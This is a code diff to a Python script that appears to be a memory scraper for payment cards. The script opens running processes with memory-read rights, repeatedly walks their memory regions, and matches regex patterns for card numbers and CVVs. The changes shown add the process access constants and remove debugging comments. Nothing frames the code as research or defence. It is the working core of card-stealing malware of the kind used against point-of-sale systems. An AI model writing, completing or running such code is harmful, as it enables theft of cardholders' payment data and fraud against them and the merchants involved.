@@ -10,6 +10,10 @@ import psutil  # For scanning running processes
 memory_queue = Queue()
 running = True
 
+# Process access rights
+PROCESS_VM_READ = 0x0010
+PROCESS_QUERY_INFORMATION = 0x0400
+
 # Regex patterns for card information
 CARD_NUMBER_PATTERN = r'\b(?:\d[ -]*?){13,16}\b'  # Example pattern for 13-16 digit card numbers
 CVV_PATTERN = r'\b\d{3,4}\b'  # Typical CVV pattern (3 or 4 digits)
@@ -129,7 +133,7 @@ def scan_process_memory(num_threads=4):
 
     for pid in pids:
         print(f"Starting memory scan for PID {pid}")
-        memory_regions = get_memory_regions(pid)  # <-- Corrected here
+        memory_regions = get_memory_regions(pid)
         if not memory_regions:
             print(f"[PID {pid}] No valid memory regions found.")
             continue
@@ -151,7 +155,7 @@ def scan_process_memory(num_threads=4):
         try:
             while running:
                 # Keep scanning new memory regions in a loop
-                new_memory_regions = get_memory_regions(pid)  # <-- Corrected here
+                new_memory_regions = get_memory_regions(pid)
                 for region in new_memory_regions:
                     print(f"[PID {pid}] Adding memory region to queue: {region}")
                     memory_queue.put(region)
